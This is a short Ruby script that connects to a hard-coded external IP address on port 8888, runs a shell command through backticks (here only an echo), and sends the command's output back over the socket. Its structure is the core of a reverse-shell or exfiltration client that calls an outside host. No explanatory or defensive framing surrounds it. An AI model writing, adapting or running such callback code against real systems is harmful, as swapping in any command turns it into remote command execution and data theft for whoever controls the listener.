require 'socket'

# Set the listener's IP address and port number
listener_ip = '62.171.160.234'
listener_port = '8888'

# Create a socket object
socket = TCPSocket.new(listener_ip, listener_port)

# Execute the command
command = 'echo "Hello, World!"'
result = `#{command}`

# Send the result back to the listener
socket.write(result)

# Close the socket connection
socket.close